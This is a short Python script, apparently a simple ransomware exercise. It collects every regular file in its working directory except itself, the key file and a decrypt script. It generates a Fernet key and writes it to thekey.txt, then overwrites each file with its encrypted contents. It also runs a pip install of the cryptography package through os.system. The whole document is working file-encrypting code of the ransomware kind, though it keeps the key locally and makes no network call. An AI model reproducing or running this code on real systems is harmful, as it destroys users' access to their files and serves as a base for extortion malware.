import os
from cryptography.fernet import Fernet
os.system("pip install cryptography")


files = []
for file in os.listdir():
    if file == "class1.py" or file == "thekey.txt" or file == "decrypt.py":
        continue
    if os.path.isfile(file):
        files.append(file)
print(files)

key = Fernet.generate_key()

thekey = open("thekey.txt", "wb")
thekey.write(key)
thekey.close()
for file in files:
    thefile = open(file, "rb")
    contents = thefile.read()
    thefile.close()
    encrypted_data = Fernet(key).encrypt(contents)
    thefile = open(file, "wb")
    thefile.write(encrypted_data)
    thefile.close()